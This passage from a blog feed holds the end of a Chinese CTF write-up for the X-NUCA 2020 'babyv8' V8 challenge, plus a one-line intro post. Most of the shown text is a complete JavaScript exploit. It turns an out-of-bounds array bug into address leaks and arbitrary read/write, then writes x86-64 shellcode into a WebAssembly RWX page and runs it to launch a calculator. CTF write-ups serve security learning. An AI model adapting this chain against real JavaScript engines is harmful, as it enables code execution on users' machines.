class="keyword">this</span>.u32.set(tmp);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.f64[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    f2u(val)&#123;</span><br><span class="line">        <span class="keyword">this</span>.f64[<span class="number">0</span>] = val;</span><br><span class="line">        <span class="keyword">let</span> tmp = <span class="built_in">Array</span>.from(<span class="keyword">this</span>.u32);</span><br><span class="line">        <span class="keyword">return</span> tmp[<span class="number">0</span>] + tmp[<span class="number">1</span>] * <span class="number">0x100000000</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">mem = <span class="keyword">new</span> Memory();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">116</span>,<span class="number">101</span>,<span class="number">115</span>,<span class="number">116</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">32</span>,<span class="number">11</span>]);</span><br><span class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> WebAssembly.Module(wasmCode);</span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> WebAssembly.Instance(wasmModule, &#123;&#125;);</span><br><span class="line"><span class="keyword">var</span> f = wasmInstance.exports.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> oob_arr = [<span class="number">1.1</span>, <span class="number">1.2</span>, <span class="number">1.3</span>];</span><br><span class="line"><span class="keyword">const</span> oob_fun = [<span class="number">1.1</span>, <span class="number">1.2</span>, <span class="number">1.3</span>];</span><br><span class="line">oob_arr.pop();</span><br><span class="line">oob_arr.push(<span class="number">1.4</span>);</span><br><span class="line"><span class="keyword">let</span> vicbuf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">200</span>);</span><br><span class="line"><span class="keyword">var</span> vicobj = &#123;<span class="attr">marker</span>: <span class="string">'aaaaaa'</span>, <span class="attr">obj</span>:&#123;&#125;&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a_addr = mem.f2u(oob_arr[<span class="number">4</span>]);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"0x"</span>+ a_addr.toString(<span class="number">16</span>));</span><br><span class="line"></span><br><span class="line">oob_arr[<span class="number">4</span>] = mem.u2f(<span class="number">0x10000000000</span> + a_addr);</span><br><span class="line"></span><br><span class="line">leak_heap = mem.f2u(oob_arr[<span class="number">15</span>]);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"0x"</span> + leak_heap.toString(<span class="number">16</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ARW</span></span>&#123;</span><br><span class="line">    <span class="keyword">constructor</span>(buf_offset, obj_offset)&#123;</span><br><span class="line">        <span class="keyword">this</span>.buf_offset = buf_offset;</span><br><span class="line">        <span class="keyword">this</span>.obj_offset = obj_offset;</span><br><span class="line">    &#125;</span><br><span class="line">    read(addr)&#123;</span><br><span class="line">        oob_arr[<span class="keyword">this</span>.buf_offset] = mem.u2f(addr);</span><br><span class="line">        <span class="keyword">let</span> tmp = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(vicbuf,<span class="number">0</span>, <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">return</span> mem.f2u(tmp[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    write(addr, data)&#123;</span><br><span class="line">        oob_arr[<span class="keyword">this</span>.buf_offset] = mem.u2f(addr);</span><br><span class="line">        <span class="keyword">let</span> tmp = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(vicbuf, <span class="number">0</span>, <span class="number">8</span>);</span><br><span class="line">        tmp.set([mem.u2f(data)])</span><br><span class="line">    &#125;</span><br><span class="line">    addrof(one_obj)&#123;</span><br><span class="line">        vicobj.obj = one_obj;</span><br><span class="line">        <span class="keyword">return</span> (mem.f2u(oob_arr[<span class="keyword">this</span>.obj_offset]) - (mem.f2u(oob_arr[<span class="keyword">this</span>.obj_offset]) &amp; <span class="number">0xffffffff</span>)) / <span class="number">0x100000000</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    writebuf(addr, data)&#123;</span><br><span class="line">        oob_arr[<span class="keyword">this</span>.buf_offset] = mem.u2f(addr);</span><br><span class="line">        <span class="keyword">let</span> u8 = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(vicbuf);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span> ; i &lt; data.length; i++)&#123;</span><br><span class="line">            u8[i] = data[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">leakhigh</span>(<span class="params">addr</span>)</span>&#123;</span><br><span class="line">    oob_arr[<span class="number">10</span>] = mem.u2f(<span class="number">0x10000000000</span> + addr - <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">return</span> (mem.f2u(oob_fun[<span class="number">0</span>]) - (mem.f2u(oob_fun[<span class="number">0</span>]) &amp; <span class="number">0xffffffff</span>)) / <span class="number">0x100000000</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">leaklow</span>(<span class="params">addr</span>)</span>&#123;</span><br><span class="line">    oob_arr[<span class="number">10</span>] = mem.u2f(<span class="number">0x10000000000</span> + addr - <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">return</span> mem.f2u(oob_fun[<span class="number">0</span>]) &amp; <span class="number">0xffffffff</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">leak</span>(<span class="params">addr</span>)</span>&#123;</span><br><span class="line">    oob_arr[<span class="number">10</span>] = mem.u2f(<span class="number">0x10000000000</span> + addr - <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">return</span> mem.f2u(oob_fun[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">arw = <span class="keyword">new</span> ARW(<span class="number">15</span>,<span class="number">21</span>);</span><br><span class="line"></span><br><span class="line">f_addr = arw.addrof(f);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"0x"</span> + f_addr.toString(<span class="number">16</span>));</span><br><span class="line"></span><br><span class="line">shared_info_addr =  leakhigh(f_addr + <span class="number">8</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"shared_info_addr: 0x"</span> + shared_info_addr.toString(<span class="number">16</span>));</span><br><span class="line">WasmExportedFunctionData = leakhigh(shared_info_addr);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"WasmExportedFunctionData: 0x"</span> + WasmExportedFunctionData.toString(<span class="number">16</span>));</span><br><span class="line">instance_addr = leaklow(WasmExportedFunctionData+<span class="number">8</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"instance_addr: 0x"</span> + instance_addr.toString(<span class="number">16</span>));</span><br><span class="line">rwxmap = leak(instance_addr+<span class="number">0x68</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"rwx_addr: 0x"</span> + rwxmap.toString(<span class="number">16</span>));</span><br><span class="line"><span class="keyword">let</span> calc = [<span class="number">0xe8</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x41</span>, <span class="number">0x59</span>, <span class="number">0x49</span>, <span class="number">0x81</span>, <span class="number">0xe9</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xb8</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xbf</span>, <span class="number">0x6b</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x49</span>, <span class="number">0x8d</span>, <span class="number">0xb1</span>, <span class="number">0x61</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xba</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x20</span>, <span class="number">0x00</span>, <span class="number">0x0f</span>, <span class="number">0x05</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xc7</span>, <span class="number">0xb8</span>, <span class="number">0x51</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0f</span>, <span class="number">0x05</span>, <span class="number">0x49</span>, <span class="number">0x8d</span>, <span class="number">0xb9</span>, <span class="number">0x62</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xb8</span>, <span class="number">0xa1</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0f</span>, <span class="number">0x05</span>, <span class="number">0xb8</span>, <span class="number">0x3b</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x49</span>, <span class="number">0x8d</span>, <span class="number">0xb9</span>, <span class="number">0x64</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x6a</span>, <span class="number">0x00</span>, <span class="number">0x57</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xe6</span>, <span class="number">0x49</span>, <span class="number">0x8d</span>, <span class="number">0x91</span>, <span class="number">0x7e</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x6a</span>, <span class="number">0x00</span>, <span class="number">0x52</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xe2</span>, <span class="number">0x0f</span>, <span class="number">0x05</span>, <span class="number">0xeb</span>, <span class="number">0xfe</span>, <span class="number">0x2e</span>, <span class="number">0x2e</span>, <span class="number">0x00</span>, <span class="number">0x2f</span>, <span class="number">0x75</span>, <span class="number">0x73</span>, <span class="number">0x72</span>, <span class="number">0x2f</span>, <span class="number">0x62</span>, <span class="number">0x69</span>, <span class="number">0x6e</span>, <span class="number">0x2f</span>, <span class="number">0x67</span>, <span class="number">0x6e</span>, <span class="number">0x6f</span>, <span class="number">0x6d</span>, <span class="number">0x65</span>, <span class="number">0x2d</span>, <span class="number">0x63</span>, <span class="number">0x61</span>, <span class="number">0x6c</span>, <span class="number">0x63</span>, <span class="number">0x75</span>, <span class="number">0x6c</span>, <span class="number">0x61</span>, <span class="number">0x74</span>, <span class="number">0x6f</span>, <span class="number">0x72</span>, <span class="number">0x00</span>, <span class="number">0x44</span>, <span class="number">0x49</span>, <span class="number">0x53</span>, <span class="number">0x50</span>, <span class="number">0x4c</span>, <span class="number">0x41</span>, <span class="number">0x59</span>, <span class="number">0x3d</span>, <span class="number">0x3a</span>, <span class="number">0x30</span>, <span class="number">0x00</span>];</span><br><span class="line"></span><br><span class="line">arw.writebuf(rwxmap, calc);</span><br><span class="line"></span><br><span class="line">f();</span><br></pre></td></tr></table></figure></p><p>参考资料：</p><blockquote><p>https://github.com/NeSE-Team/XNUCA2020Qualifier/blob/main/Pwn/babyv8/writeup.md</p><p>https://doar-e.github.io/blog/2019/01/28/introduction-to-turbofan/#preparing-turbolizer</p></blockquote><p>如有错误，还请各位dalao多多批评指教。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;今年x-nuca出了一道v8题目，给出了patch文件：&lt;/p&gt;
&lt;p&gt;&lt;figure class=&quot;highlight diff&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;spa</summary>
      
    
    
    
    
    <category term="CTF" scheme="https://rw1nd.github.io/tags/CTF/"/>
    
    <category term="V8" scheme="https://rw1nd.github.io/tags/V8/"/>
    
  </entry>
  
  <entry>
    <title>My blog</title>
    <link href="https://rw1nd.github.io/2020/10/22/My-blog/"/>
    <id>https://rw1nd.github.io/2020/10/22/My-blog/</id>
    <published>2020-10-22T04:36:59.000Z</published>
    <updated>2020-10-22T05:36:25.309Z</updated>
    
    <content type="html"><![CDATA[<p>This blog is just used to record my daily study.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;This blog is just used to record my daily study.&lt;/p&gt;
</summary>
      
    
    
    
    
    <category term="Misc" scheme="https://rw1nd.github.io/tags/Misc/"/>
    
  </entry>
  
</feed>
